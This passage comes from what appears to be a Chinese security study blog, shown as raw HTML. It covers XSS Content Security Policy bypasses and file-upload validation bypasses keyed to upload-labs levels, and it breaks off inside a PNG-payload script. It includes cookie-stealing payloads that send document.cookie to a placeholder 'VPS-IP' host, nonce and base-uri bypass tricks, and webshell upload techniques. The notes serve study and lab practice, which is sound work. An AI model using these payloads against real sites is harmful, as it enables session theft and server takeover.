class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>&quot;)<br></code></pre></td></tr></table></figure><h4 id="分号过滤"><a href="#分号过滤" class="headerlink" title="分号过滤"></a>分号过滤</h4><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><span class="hljs-template-variable">&#123;onerror=alert&#125;</span><span class="language-xml"><span class="language-javascript"><span class="hljs-keyword">throw</span> <span class="hljs-number">1</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h4 id="绕过CSP"><a href="#绕过CSP" class="headerlink" title="绕过CSP"></a>绕过CSP</h4><h5 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h5><p>CSP指的是Content Security Policy，即内容安全策略。CSP指令可以在HTTP响应头中设置，也可以在HTML文档中使用meta标签设置，让管理员可以告诉浏览器哪些资源可以加载到页面中，例如可以信任哪些来源的JavaScript、CSS、图片等资源。这样，浏览器就只会加载来自这些受信任来源的资源，从而减少了被攻击的风险。</p><h5 id="分类-1"><a href="#分类-1" class="headerlink" title="分类"></a>分类</h5><p>1.Content-Security-Policy:配置好并且启用后，直接拦截不符合CSP的资源<br>2.Content-Security-Policy-Report-Only：配置好之后仅记录违反限制的行为，并不能进行拦截(这里也是一个漏洞)，和report-uri选项配合时可以进行拦截违法行为</p><h5 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h5><p>CSP由一组指令组成，每个指令用于指定允许加载的资源类型和来源，一个CSP头由多组CSP策略组成，中间由分号分隔。</p><p>指令关键字：指令关键字用于标识指令类型，例如default-src、script-src、style-src等<br>指令值：指令值用于指定允许加载资源的来源，可以是一个或多个来源，多个来源之间用空格分隔。来源可以是URL、域名、IP地址或通配符等<br>指令选项：指令选项用于指定一些特殊行为，例如’self’选项用于指定资源只能从同一域名加载，’unsafe-inline’选项用于允许内联脚本等<br>指令策略：指令策略用于指定如何处理不符合CSP策略的请求，可以选择’allow’、’block’、’report’等选项，每一组策略包含一个策略指令和一个内容源列表<br>例：</p><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csp"><span class="hljs-attribute">Content-Security-Policy</span>: <span class="hljs-keyword">default-src</span> <span class="hljs-string">&#x27;self&#x27;</span>; <span class="hljs-keyword">script-src</span> <span class="hljs-string">&#x27;self&#x27;</span> <span class="hljs-string">&#x27;unsafe-inline&#x27;</span> example.com; <span class="hljs-keyword">img-src</span> * data:; <span class="hljs-keyword">report-uri</span> /csp-report<br></code></pre></td></tr></table></figure><p>Content-Security-Policy是CSP的header字段<br>default-src指令用于限制默认允许加载的资源类型和来源<br>script-src指令用于限制JavaScript脚本的来源<br>img-src指令用于限制图片的来源<br>策略还指定了违规报告的URL</p><h5 id="常见策略指令"><a href="#常见策略指令" class="headerlink" title="常见策略指令"></a>常见策略指令</h5><p>与特定的源（例如域名、协议、端口）一起使用或使用通配符（*）来表示所有来源<br>default-src: 指定默认允许加载的资源类型和来源。<br>script-src: 限制JavaScript脚本的来源。<br>style-src: 限制CSS样式表的来源。<br>img-src: 限制图片的来源。<br>connect-src: 限制XMLHttpRequest和WebSocket的来源。<br>font-src: 限制字体的来源。<br>object-src: 限制object、embed、applet等插件的来源。<br>media-src: 限制音频、视频等媒体资源的来源。<br>frame-src: 限制iframe的来源。<br>child-src: 限制子窗口的来源，包括iframe、web worker、embed等。<br>form-action: 限制表单提交的目标地址。<br>sandbox: 限制iframe中的脚本和插件的执行权限。<br>base-uri: 限制base标签的目标地址。<br>report-uri: 指定违规报告的URL。</p><h5 id="策略指令中常见的关键词"><a href="#策略指令中常见的关键词" class="headerlink" title="策略指令中常见的关键词"></a>策略指令中常见的关键词</h5><p>用于指定资源的类型和来源<br>1.self: 表示当前网站的源，也就是只允许从同一域名加载资源。<br>2.none: 表示不允许加载任何资源。<br>3.unsafe-inline: 表示允许内联脚本、样式表等，但存在安全风险。<br>4.unsafe-eval: 表示允许使用eval()函数执行代码，但存在安全风险。<br>5.strict-dynamic: 表示允许通过nonce或hash机制执行动态脚本，但不允许其他方式的动态脚本。<br>6.nonce-xxxx: 表示允许执行指定的nonce值所对应的脚本，用于限制内联脚本的来源。<br>7.hash-xxxx: 表示允许执行指定的哈希值所对应的脚本，用于限制外部脚本的来源。<br>8.data:: 表示允许加载data URI格式的资源。<br>9.blob:: 表示允许加载blob URL格式的资源。<br>10.mediastream:: 表示允许加载mediastream格式的资源</p><h5 id="CSP策略指令中的存在安全风险数据类型"><a href="#CSP策略指令中的存在安全风险数据类型" class="headerlink" title="CSP策略指令中的存在安全风险数据类型"></a>CSP策略指令中的存在安全风险数据类型</h5><p>1.data:用于指定可以从data URI格式加载的资源。data URI可以直接将资源的内容编码为字符串嵌入到URL中，而不需要从外部加载资源<br>作为攻击者，可以利用data uri构造恶意脚本直接嵌入URL中，从而进行XSS攻击<br>2.mediastream:用于指定可以从哪些媒体流（例如摄像头或麦克风）加载资源。配合media-src策略指令使用，允许 mediastream: URI 作为内容来源。<br>3.blob:允许在HTML页面中使用Blob URL，这是一种允许在浏览器中生成URL的API。当CSP策略允许任何来源使用blob数据类型时，会产生安全风险。<br>4.unsafe-inline:允许在HTML页面中直接嵌入JavaScript代码。这是一种方便的方法，可以将脚本与页面混合在一起，但是也容易受到XSS攻击的威胁。<br>5.unsafe-eval:允许在HTML页面中使用eval函数来执行JavaScript代码，攻击者可以通过注入特殊的参数（数据注入攻击）来控制eval函数的执行结果，从而达到执行恶意代码的目的。</p><h5 id="绕过策略"><a href="#绕过策略" class="headerlink" title="绕过策略"></a>绕过策略</h5><p>1.iframe标签<br>如：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"><span class="hljs-comment">&lt;!--1.php--&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php">    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;Evi1s7&#x27;</span>])) &#123;</span><br><span class="language-php">        <span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&#x27;Ev1ls7&#x27;</span>,<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1000</span>)));</span><br><span class="language-php">    &#125;</span><br><span class="language-php">        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Security-Policy: default-src &#x27;self&#x27;;&quot;</span>);</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>CSP<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>CSP<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Evi1s7&#x27;</span>])) &#123;</span><br><span class="language-php">        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your GET content:&quot;</span>.@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Evi1s7&#x27;</span>];</span><br><span class="language-php">    &#125;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-comment">&lt;!--2.php--&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>CSP<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>CSP<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Evi1s7&#x27;</span>])) &#123;</span><br><span class="language-php">        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your GET content:&quot;</span>.@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Evi1s7&#x27;</span>];</span><br><span class="language-php">    &#125;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">&lt;/html</span><br></code></pre></td></tr></table></figure><p>该代码对于2.php没有进行设置，可利用iframe特性（在HTML文档中iframe每出现一次，一个IFrame对象就会被创建，可以使用 document.createElement()方法来创建）<br>创建一个iframe标签将其嵌入到DOM文档的body元素中，通过设置iframe标签的属性使浏览器渲染1.php，iframe也会内嵌到页面中<br>2.location绕过（unsafe-inline存在安全风险的利用）<br>如：</p><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csp"><span class="hljs-attribute">Content-Security-Policy</span>: <span class="hljs-keyword">default-src</span> <span class="hljs-string">&#x27;self&#x27;</span>; <span class="hljs-keyword">script-src</span> <span class="hljs-string">&#x27;self&#x27;</span> <span class="hljs-string">&#x27;unsafe-inline&#x27;</span><br></code></pre></td></tr></table></figure><p>可以利用location.href/window.location/window.open 绕过</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-built_in">?name</span>=<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&#x27;http://VPS-IP:port&#x27;</span>+<span class="hljs-built_in">escape</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>3.link标签<br>适用于可以执行JavaScript脚本，但是无法将CSP数据带出<br>以firefox为例</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;link <span class="hljs-attribute">rel</span>=<span class="hljs-string">&quot;dns-prefetch&quot;</span> <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;//<span class="hljs-variable">$&#123;cookie&#125;</span>.vps_ip&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>以如下带出cookie</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">var link = document.create<span class="hljs-constructor">Element(<span class="hljs-string">&quot;link&quot;</span>)</span>;<br>link.set<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;rel&quot;</span>, <span class="hljs-string">&quot;prefetch&quot;</span>)</span>;<br>link.set<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;href&quot;</span>, <span class="hljs-string">&quot;//VPS-IP/?&quot;</span> + <span class="hljs-params">document</span>.<span class="hljs-params">cookie</span>)</span>;<br>document.head.append<span class="hljs-constructor">Child(<span class="hljs-params">link</span>)</span><br></code></pre></td></tr></table></figure><p>href属性被设定为设置一个超链接，当被点击是，会以GET的形式请求我们的VPS，且带着用户自己的cookie值作为查询字符串附加在URL的末尾。<br>4.低版本CDN绕过<br>如果此CDN服务商在CSP白名单中<br>如：<br>以Jquery-mobile库为例，如果题目给出的CSP策略中包含”script-src ‘unsafe-eval’”或者”script-src ‘strict-dynamic’”，可以以</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&lt;<span class="hljs-keyword">div</span> data-role=popup <span class="hljs-built_in">id</span>=&#x27;&lt;<span class="hljs-keyword">script</span>&gt;alert(hack)&lt;/<span class="hljs-keyword">script</span>&gt;&#x27;&gt;&lt;/<span class="hljs-keyword">div</span>&gt;<br></code></pre></td></tr></table></figure><p>5.利用meta标签实现url跳转<br>如：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;meta <span class="hljs-attribute">http-equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span> <span class="hljs-attribute">content</span>=<span class="hljs-string">&quot;3;url=https://example.com&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>6.CRLF绕过<br>当一个页面存在CRLF漏洞时，且我们的可控点在CSP上方，就可以通过注入回车换行，将CSP挤到HTTP返回体中<br>7.站点可控静态资源绕过<br>要求站点存在可控静态资源，且站点在CSP白名单中<br>如：</p><figure class="highlight plaintext"><figcaption><span>http-equiv</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs <meta">```<br>www.google-analytics.com中可以自定义JavaScript，以此绕过<br>8.站点可控JSONP绕过<br>站点存在可控的JSONP，且站点在CSP白名单中<br>有些站点会让jsonp不返回html类型防止直接的反射型XSS，但是如果将url插入到script标签中，除非设置x-content-type-options头，否者尽管返回类型不一致，浏览器依旧会当成js进行解析<br>9.Base-uri绕过<br>script-src只使用nonce，没有额外设置base-uri，页面引用存在相对路径的script标签<br>当服务器CSP script-src采用了nonce时，如果只设置了default-src没有额外设置base-uri，就可以使用base标签使当前页面上下文为自己的vps，如果页面中的合法script标签采用了相对路径，那么最终加载的js就是针对base标签中指定url的相对路径。如果页面的script-src不是采用的nonce而是self或者域名ip，则不能使用此方法<br>10.不完整script标签绕过nonce<br>适用于可控点在合法script标签上方,且其中没有其他标签，XSS页面的CSP script-src只采用了nonce方式<br><br>特性：<br> 1.当浏览器碰到一个左尖括号时，会变成标签开始状态，然后会一直持续到碰到右尖括号为止，在其中的数据都会被当成标签名或者属性<br> 2.当一个标签存在两个同名属性时，第二个属性的属性名及其属性值都会被浏览器忽略<br> 3.当标签未闭合时，html解析器会一直去寻找下一个引号，从而闭合src属性，所以说在下一个引号前的标签都不会被解析<br><br>例：<br></code></pre></td></tr></table></figure><?php header("X-XSS-Protection:0");?><meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'nonce-xxxxx'"><?php echo $_GET['xss']?><script nonce='xxxxx'>  //do some thing</script><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">可使用<br></code></pre></td></tr></table></figure>?xss=<script src=data:text/plain,alert(1)```nonce会进入不完整script标签成为其属性名11.借助外域资源绕过适用于可以进行外域资源引用，且注入点在CSP策略下方当设置的CSP策略指令img-src允许加载外域图片资源，可以尝试利用img标签XSS恶意代码，从而注入到该网页。当标签未闭合时，html解析器会一直去寻找下一个引号，从而闭合src属性，所以说在下一个引号前的标签都不会被解析，从而绕过CSP。12.PDF XSS绕过适用于没有设置object-src，或者object-src没有设置为'none'，pdf用的是chrome的默认解析器。原理为攻击者将恶意代码写入PDF文件中，将此图片利用文件上传或者创建在自己的VPS上，受害者访问从而进行XSS攻击。不能获取页面cookie，但是可以弹窗，url跳转等。13.SVG矢量图绕过原理同PDF XSS绕过]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023/08/10：upload笔记</title>
    <link href="/2023/08/10/uploadnote/"/>
    <url>/2023/08/10/uploadnote/</url>
    
    <content type="html"><![CDATA[<p><a href="https://paper.seebug.org/560/">https://paper.seebug.org/560/</a></p><h2 id="代码相关"><a href="#代码相关" class="headerlink" title="代码相关"></a>代码相关</h2><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mel">$_FILES\[‘<span class="hljs-keyword">file</span>’][‘name’] 客户端文件名称<br>$_FILES\[‘<span class="hljs-keyword">file</span>’][‘type’] 文件的MIME类型<br>$_FILES\[‘<span class="hljs-keyword">file</span>’][‘<span class="hljs-keyword">size</span>’] 文件大小 单位字节<br>$_FILES\[‘<span class="hljs-keyword">file</span>’][‘tmp_name’] 文件被上传后再服务器端临时文件名，可以在php.ini中指定<br></code></pre></td></tr></table></figure><p>文件上传结束后，默认的被储存在临时文件夹中，这时必须把他从临时目录中删除或移动到其他地方，可使用<code>copy()</code>或<code>move_uploaded_file()</code><br>可能存在错误使用的函数：<code>empty()、isset()、strpos()、rename()、iconv()、copy()</code></p><h2 id="校验过程"><a href="#校验过程" class="headerlink" title="校验过程"></a>校验过程</h2><p>1.客户端javascript检测<br>（上传文件）<br>2.服务端MIME检测<br>3.目录路径检测<br>4.文件扩展名检测<br>5.文件内容检测</p><h2 id="校验方式与绕过"><a href="#校验方式与绕过" class="headerlink" title="校验方式与绕过"></a>校验方式与绕过</h2><h3 id="javascript检测（upload-lab-pass-1）"><a href="#javascript检测（upload-lab-pass-1）" class="headerlink" title="javascript检测（upload-lab pass 1）"></a>javascript检测（upload-lab pass 1）</h3><p>通常验证上传文件的扩展名是否符合验证条件</p><h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><p>1.浏览器禁用js<br>2.F12修改js代码绕过验证<br>3.使用burp抓包直接提交，绕过js验证</p><h3 id="MIME（content-type字段校验）（upload-lab-pass-2）"><a href="#MIME（content-type字段校验）（upload-lab-pass-2）" class="headerlink" title="MIME（content-type字段校验）（upload-lab pass 2）"></a>MIME（content-type字段校验）（upload-lab pass 2）</h3><p>MIME type代表互联网媒体类型，在html文件中可以使用content-type属性表示，描述了文件类型的互联网标准。Response对象通过设置ContentType使客户端浏览器，区分不同种类的数据，并根据不同的MIME调用浏览器内不同的程序嵌入模块来处理相应的数据。</p><h4 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h4><p>使用Burp截取上传数据包，修改Content-Type的值</p><h3 id="文件扩展名检测"><a href="#文件扩展名检测" class="headerlink" title="文件扩展名检测"></a>文件扩展名检测</h3><h4 id="方法-1：-htaccess（upload-lab-pass-4）"><a href="#方法-1：-htaccess（upload-lab-pass-4）" class="headerlink" title="方法 1：.htaccess（upload-lab pass 4）"></a>方法 1：.htaccess（upload-lab pass 4）</h4><p>配合Apache的.htaccess文件上传解析漏洞<br>通过htaccess文件可以实现改变文件扩展名等操作绕过检测</p><h4 id="方法-2：解析缺陷绕过（upload-lab-pass-18）"><a href="#方法-2：解析缺陷绕过（upload-lab-pass-18）" class="headerlink" title="方法 2：解析缺陷绕过（upload-lab pass 18）"></a>方法 2：解析缺陷绕过（upload-lab pass 18）</h4><p>Apache的解析漏洞主要特性为Apache是从后面开始检查后缀，按最后一个合法后缀执行，将木马的后缀进行修改为允许上传的类型后，即可成功绕过验证，最终拿到权限。<br>例如将后缀修改为<code>.7z、.cab、.zip、.bmp</code></p><h4 id="方法-3：目录路径检测解析绕过"><a href="#方法-3：目录路径检测解析绕过" class="headerlink" title="方法 3：目录路径检测解析绕过"></a>方法 3：目录路径检测解析绕过</h4><p>例如，将保存文件的相对路径<code>uploadimg/</code>改为<code>uploadimg/1.asp/</code>，<code>filename=&quot;yijuhua.asp&quot;</code>改为<code>filename=&quot;yijuhua.asp/1.jpg&quot;</code>，上传文件的名字为<code>yijuhua.asp/1.jpg</code>时服务器会从头部查找查找”.”号，然后查找”/“，如果有则内存截断，原文件会被解析为<code>/yijuhua.asp</code></p><h4 id="方法-4：解析缺陷绕过（与上类似）"><a href="#方法-4：解析缺陷绕过（与上类似）" class="headerlink" title="方法 4：解析缺陷绕过（与上类似）"></a>方法 4：解析缺陷绕过（与上类似）</h4><p>例如，将保存文件的相对路径<code>uploadimg/</code>改为<code>uploadimg/1.php</code>，<code>filename=&quot;yijuhua.php&quot;</code>改为<code>filename=&quot;yijuhua.jpg&quot;</code>，文件的名字为<code>1.php;yijuhua.jpg</code>会作为php解析，原理类似。</p><h4 id="方法-5：黑名单绕过"><a href="#方法-5：黑名单绕过" class="headerlink" title="方法 5：黑名单绕过"></a>方法 5：黑名单绕过</h4><p>1.使用大小写绕过（针对对大小写不敏感的系统如windows）<br>2.使用黑名单外的脚本类型，如：php5,asa 和 cer等（IIS默认支持解析.asp,.cdx, .asa,.cer等）</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">PHP: <span class="hljs-string">.php</span>, <span class="hljs-string">.php2</span>, <span class="hljs-string">.php3</span>, <span class="hljs-string">.php4</span>, <span class="hljs-string">.php5</span>, <span class="hljs-string">.php6</span>, <span class="hljs-string">.php7</span>, <span class="hljs-string">.phps</span>, <span class="hljs-string">.phps</span>, <span class="hljs-string">.pht</span>, <span class="hljs-string">.phtm</span>, <span class="hljs-string">.phtml</span>, <span class="hljs-string">.pgif</span>, <span class="hljs-string">.shtml</span>, <span class="hljs-string">.htaccess</span>, <span class="hljs-string">.phar</span>, <span class="hljs-string">.inc</span>, <span class="hljs-string">.hphp</span>, <span class="hljs-string">.ctp</span>, <span class="hljs-string">.module</span><br>    Working in PHPv8: <span class="hljs-string">.php</span>, <span class="hljs-string">.php4</span>, <span class="hljs-string">.php5</span>, <span class="hljs-string">.phtml</span>, <span class="hljs-string">.module</span>, <span class="hljs-string">.inc</span>, <span class="hljs-string">.hphp</span>, <span class="hljs-string">.ctp</span><br><br>ASP: <span class="hljs-string">.asp</span>, <span class="hljs-string">.aspx</span>, <span class="hljs-string">.config</span>, <span class="hljs-string">.ashx</span>, <span class="hljs-string">.asmx</span>, <span class="hljs-string">.aspq</span>, <span class="hljs-string">.axd</span>, <span class="hljs-string">.cshtm</span>, <span class="hljs-string">.cshtml</span>, <span class="hljs-string">.rem</span>, <span class="hljs-string">.soap</span>, <span class="hljs-string">.vbhtm</span>, <span class="hljs-string">.vbhtml</span>, <span class="hljs-string">.asa</span>, <span class="hljs-string">.cer</span>, <span class="hljs-string">.shtml</span><br><br>Jsp: <span class="hljs-string">.jsp</span>, <span class="hljs-string">.jspx</span>, <span class="hljs-string">.jsw</span>, <span class="hljs-string">.jsv</span>, <span class="hljs-string">.jspf</span>, <span class="hljs-string">.wss</span>, <span class="hljs-string">.do</span>, <span class="hljs-string">.action</span><br><br>Coldfusion: <span class="hljs-string">.cfm</span>, <span class="hljs-string">.cfml</span>, <span class="hljs-string">.cfc</span>, <span class="hljs-string">.dbm</span><br><br>Flash: <span class="hljs-string">.swf</span><br><br>Perl: <span class="hljs-string">.pl</span>, <span class="hljs-string">.cgi</span><br><br>Erlang Yaws Web Server: <span class="hljs-string">.yaws</span><br></code></pre></td></tr></table></figure><p>3.配合操作系统文件命令规则<br>4.双扩展名之间使用00截断，绕过验证上传恶意代码：<code>test.php%00.jpg</code><br>5.超长文件名截断上传（windows 258byte | linux 4096byte）<br>6.空格及点绕过<br>7.<code>::$DATA</code>绕过</p><h4 id="方法-6：服务端检测文件内容配合文件包含漏洞"><a href="#方法-6：服务端检测文件内容配合文件包含漏洞" class="headerlink" title="方法 6：服务端检测文件内容配合文件包含漏洞"></a>方法 6：服务端检测文件内容配合文件包含漏洞</h4><p>如：先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；然后再上传一个php的文件，内容为<code>&lt;?php Include(“上传的txt文件路径”);?&gt;</code>，php文件就会去引用txt文件的内容，从而绕过校验</p><h4 id="方法-7：PHP特性（使用数组绕过）"><a href="#方法-7：PHP特性（使用数组绕过）" class="headerlink" title="方法 7：PHP特性（使用数组绕过）"></a>方法 7：PHP特性（使用数组绕过）</h4><p>如：<code>file_put_contents()</code>函数的第二个参数，可以是数组；然后，如果代码里用正则匹配 bad word 的时候，对一个数组进行正则匹配没用</p><h4 id="方法-8：服务端检测文件头（upload-lab-pass-15）"><a href="#方法-8：服务端检测文件头（upload-lab-pass-15）" class="headerlink" title="方法 8：服务端检测文件头（upload-lab pass 15）"></a>方法 8：服务端检测文件头（upload-lab pass 15）</h4><p>不同文件头（PHP使用getimagesize函数验证）：<br>PNG： 文件头标识 (8 bytes) 89 50 4E 47 0D 0A 1A 0A<br>JPEG： 文件头标识 (2 bytes): 0xff, 0xd8 (SOI) (JPEG 文件标识)<br>GIF： 文件头标识 (6 bytes) 47 49 46 38 39(37) 61<br>在恶意脚本前加上允许上传文件的头标识</p><h4 id="方法-8：竞争上传（upload-lab-pass-17）"><a href="#方法-8：竞争上传（upload-lab-pass-17）" class="headerlink" title="方法 8：竞争上传（upload-lab pass 17）"></a>方法 8：竞争上传（upload-lab pass 17）</h4><p>原代码存在逻辑漏洞，如先上传文件，检测不通过后再删除，此时可以使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件</p><h4 id="方法-9：二次渲染（upload-lab-pass-16）"><a href="#方法-9：二次渲染（upload-lab-pass-16）" class="headerlink" title="方法 9：二次渲染（upload-lab pass 16）"></a>方法 9：二次渲染（upload-lab pass 16）</h4><p>GIF:<br>首先将GIF文件与php一句话木马合并，再将上传后的文件下载与合并后的文件对比（如010_Editor），在未被渲染的部分写一句话木马<br>PNG:<br>需要脚本构造图片</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">&lt;?php<br>$p = array(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,<br>           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,<br>           <span class="hljs-number">0x22</span>, <span 